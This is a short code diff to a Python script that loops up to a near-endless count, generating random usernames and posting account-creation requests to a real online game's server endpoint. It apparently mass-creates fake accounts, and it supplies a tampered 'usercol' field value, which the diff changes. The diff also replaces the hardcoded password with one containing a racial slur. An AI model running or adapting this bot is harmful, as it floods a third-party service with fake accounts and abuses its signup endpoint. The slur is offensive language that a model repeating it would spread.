@@ -19,7 +19,7 @@ class AFunStickArenaExperience:
 
             while Start < self.MaxAmount:
                 Username = ''.join(random.choice(LowerList) for NameLen in range(10)) + ''.join(random.choice(additional) for NameLen in range(3))
-                PostData = {"username": Username, "userpass": self.Password, "usercol": "-99099255", "action": "create"}
+                PostData = {"username": Username, "userpass": self.Password, "usercol": "248000000", "action": "create"}
                 URLData = requests.post("http://www.xgenstudios.com/stickarena/stick_arena.php", data=PostData).text
  
                 if "success" in URLData:
@@ -47,7 +47,7 @@ class AFunStickArenaExperience:
             break
  
 if __name__ == "__main__":
-    Password = 'I just want you guys to update the admin cp design.. ive been asking for awhile now'
+    Password = 'okniggaboy'
     Amount = 1000000000000000
     
     print("started!")
